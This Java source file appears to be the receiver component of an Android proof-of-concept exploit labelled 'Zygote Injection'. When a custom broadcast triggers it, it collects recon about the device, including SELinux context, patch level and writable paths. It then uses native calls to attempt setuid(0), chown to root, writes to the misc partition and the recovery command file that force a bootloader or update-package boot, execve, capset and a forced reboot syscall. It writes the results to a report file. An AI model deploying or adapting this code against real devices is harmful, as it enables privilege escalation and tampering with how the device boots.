package com.poc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Process;
import android.system.ErrnoException;
import android.system.Os;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Receiver extends BroadcastReceiver {
    static {
        System.loadLibrary("poc");
    }

    // Native methods
    public static native int native_setuid(int uid);
    public static native int native_chown(String path, int uid, int gid);
    public static native int native_write_misc(String cmd);
    public static native int native_write_recovery_command(String cmd);
    public static native int native_execve(String cmd, String[] args);
    public static native int native_reboot_syscall(int magic, int magic2, int cmd);
    public static native int native_capset();
    public static native int native_open_write(String path, String data);

    private static final String REPORT_PATH = "/cache/exploit_report.txt";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"com.poc.ACTION_START".equals(intent.getAction())) {
            return;
        }
        runExploit();
    }

    private void runExploit() {
        StringBuilder report = new StringBuilder();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());

        report.append("========================================\n");
        report.append("   Zygote Injection - Deep Recon Report\n");
        report.append("   Time: ").append(sdf.format(new Date())).append("\n");
        report.append("========================================\n\n");

        try {
            int uid = Process.myUid();
            int pid = Process.myPid();
            report.append("UID: ").append(uid).append("\n");
            report.append("PID: ").append(pid).append("\n\n");

            // Package names via reflection
            Object pm = getPackageManagerService();
            if (pm != null) {
                try {
                    Method getPackagesForUid = pm.getClass().getMethod("getPackagesForUid", int.class);
                    String[] pkgs = (String[]) getPackagesForUid.invoke(pm, uid);
                    report.append("Related Packages: ").append(pkgs != null ? String.join(", ", pkgs) : "None").append("\n\n");
                } catch (Exception e) {
                    report.append("Related Packages: Error\n\n");
                }
            }

            report.append("SELinux Context: ").append(readFile("/proc/self/attr/current")).append("\n\n");

            report.append("--- System Properties ---\n");
            report.append("ro.build.version.release: ").append(getProp("ro.build.version.release")).append("\n");
            report.append("ro.build.version.security_patch: ").append(getProp("ro.build.version.security_patch")).append("\n");
            report.append("ro.factorytest: ").append(getProp("ro.factorytest")).append("\n");
            report.append("ro.debuggable: ").append(getProp("ro.debuggable")).append("\n\n");

            report.append("--- Filesystem Access ---\n");
            report.append("Write /cache: ").append(writeTest("/cache/test_write.tmp")).append("\n");
            report.append("Write /data/local/tmp: ").append(writeTest("/data/local/tmp/test_write.tmp")).append("\n");
            report.append("Execute /system/bin/sh: ").append(canExecute("/system/bin/sh")).append("\n");
            report.append("Execute /data/local/tmp: ").append(canExecute("/data/local/tmp/dummy")).append("\n\n");

            // --- JNI System Call Tests ---
            report.append("--- JNI System Call Tests ---\n");
            int ret;

            ret = native_setuid(0);
            report.append("setuid(0): ").append(ret == 0 ? "SUCCESS" : "FAILED (errno=" + ret + ")").append("\n");

            ret = native_chown("/cache/test_write.tmp", 0, 0);
            report.append("chown /cache/test_write.tmp 0:0: ").append(ret == 0 ? "SUCCESS" : "FAILED (errno=" + ret + ")").append("\n");

            ret = native_write_misc("bootonce-bootloader");
            report.append("Write misc (bootonce-bootloader): ").append(ret == 0 ? "SUCCESS" : "FAILED (errno=" + ret + ")").append("\n");

            ret = native_write_recovery_command("--update_package=/sdcard/update.zip\n--bootonce-bootloader\n");
            report.append("Write /cache/recovery/command: ").append(ret == 0 ? "SUCCESS" : "FAILED (errno=" + ret + ")").append("\n");

            String[] execArgs = {"/system/bin/id"};
            ret = native_execve("/system/bin/id", execArgs);
            report.append("execve /system/bin/id: ").append(ret == 0 ? "SUCCESS" : "FAILED (errno=" + ret + ")").append("\n");

            // reboot syscall (restart)
            ret = native_reboot_syscall(0xfee1dead, 0x28121969, 0x1234567);
            report.append("reboot syscall (restart): ").append(ret == 0 ? "SUCCESS (rebooting)" : "FAILED (errno=" + ret + ")").append("\n");

            ret = native_capset();
            report.append("capset: ").append(ret == 0 ? "SUCCESS" : "FAILED (errno=" + ret + ")").append("\n");

            ret = native_open_write("/data/local/tmp/test.txt", "Hello");
            report.append("write /data/local/tmp/test.txt: ").append(ret == 0 ? "SUCCESS" : "FAILED (errno=" + ret + ")").append("\n");

            report.append("\n========================================\n");
            report.append("   End of Report\n");
            report.append("========================================\n");

        } catch (Throwable t) {
            report.append("\n!!! EXCEPTION: ").append(t.toString()).append("\n");
            t.printStackTrace();
        }

        // Save report
        try {
            saveReport(report.toString());
        } catch (IOException e) {
            // fallback
            try {
                new FileWriter("/data/local/tmp/exploit_report.txt").write(report.toString());
            } catch (IOException ignored) {}
        }
    }

    // --- Utilities ---
    private void saveReport(String content) throws IOException {
        File reportFile = new File(REPORT_PATH);
        if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
        try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) {
            w.write(content);
        }
        try {
            Runtime.getRuntime().exec(new String[]{"/system/bin/chmod", "0644", REPORT_PATH});
        } catch (Exception ignored) {}
    }

    private String readFile(String path) {
        try {
            return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path))).trim();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private String getProp(String key) {
        try {
            return (String) Class.forName("android.os.SystemProperties")
                    .getMethod("get", String.class, String.class)
                    .invoke(null, key, "(null)");
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private String writeTest(String path) {
        try {
            File f = new File(path);
            try (FileWriter fw = new FileWriter(f)) {
                fw.write("test");
            }
            boolean deleted = f.delete();
            return deleted ? "SUCCESS (write/delete)" : "SUCCESS (write)";
        } catch (IOException e) {
            return "FAILED: " + e.getMessage();
        }
    }

    private String canExecute(String path) {
        File f = new File(path);
        if (f.exists()) {
            return f.canExecute() ? "EXECUTABLE" : "NOT EXECUTABLE";
        } else {
            File p = f.getParentFile();
            if (p != null && p.exists()) {
                return "FILE NOT FOUND, parent exec: " + (p.canExecute() ? "YES" : "NO");
            }
            return "PATH NOT FOUND";
        }
    }

    // Reflection for ServiceManager
    private Object getService(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            android.os.IBinder binder = (android.os.IBinder) getService.invoke(null, name);
            if (binder == null) return null;
            if ("package".equals(name)) {
                Class<?> stubClass = Class.forName("android.content.pm.IPackageManager$Stub");
                Method asInterface = stubClass.getMethod("asInterface", android.os.IBinder.class);
                return asInterface.invoke(null, binder);
            }
            return binder;
        } catch (Exception e) {
            return null;
        }
    }

    private Object getPackageManagerService() {
        return getService("package");
    }
}
